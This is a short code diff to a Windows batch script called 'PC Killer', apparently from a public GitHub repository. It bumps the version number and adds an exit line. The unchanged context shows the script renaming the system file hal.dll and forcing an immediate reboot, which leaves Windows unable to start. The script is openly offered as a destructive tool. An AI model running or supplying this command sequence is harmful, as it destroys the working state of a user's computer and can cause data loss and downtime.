@@ -2,7 +2,7 @@
 title PC Killer
 setlocal
 echo Program Name: PC Killer
-echo Version: 1.3.11
+echo Version: 1.3.12
 echo License: GNU General Public License v3.0
 echo Developer: @YonatanReuvenIsraeli
 echo GitHub: https://github.com/YonatanReuvenIsraeli
@@ -53,6 +53,7 @@ ren "%windir%\System32\hal.dll" "hal1.dll"
 if not "%errorlevel%"=="0" goto "Error"
 endlocal
 "%windir%\System32\shutdown.exe" /r /t 00
+exit
 
 :"Error"
 echo There has been an error! You can try again.
